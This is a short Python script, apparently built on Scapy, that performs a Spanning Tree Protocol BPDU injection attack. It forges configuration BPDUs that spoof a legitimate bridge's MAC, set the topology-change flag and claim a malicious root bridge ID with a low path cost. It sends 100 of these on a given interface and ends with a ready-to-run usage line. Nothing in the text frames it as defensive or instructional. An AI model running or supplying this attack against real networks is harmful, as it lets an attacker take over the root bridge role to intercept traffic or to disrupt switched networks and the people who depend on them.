def bpdu_injection_attack(interface, target_bridge_mac, malicious_bridge_id):
    """
    Inject malicious BPDUs claiming to be from legitimate bridge
    """
    print("[+] Starting BPDU injection attack...")
    
    malicious_bpdu = (
        Dot3(dst="01:80:c2:00:00:00", src=target_bridge_mac) /
        LLC(dsap=0x42, ssap=0x42, ctrl=3) /
        STP(
            proto=0x0000,
            version=0x00,
            bpdutype=0x00,              # Configuration BPDU
            flags=0x01,                 # Topology Change flag set
            rootid=malicious_bridge_id, # Claim different root
            rootpathcost=0x00000001,    # Low cost path
            bridgeid=malicious_bridge_id,
            portid=0x8001,
            age=0x0000,
            maxage=0x1400,
            hello=0x0200,
            fwddelay=0x0f00
        )
    )
    
    # Send spoofed BPDUs periodically
    for i in range(100):
        sendp(malicious_bpdu, iface=interface, verbose=0)
        time.sleep(2)
        
        if i % 10 == 0:
            print(f"[+] Injected {i} spoofed BPDUs")

# Usage example
target_mac = "aa:bb:cc:dd:ee:ff"  # Legitimate bridge MAC
fake_bridge_id = 0x0000001122334455  # Malicious bridge ID
bpdu_injection_attack("eth0", target_mac, fake_bridge_id)
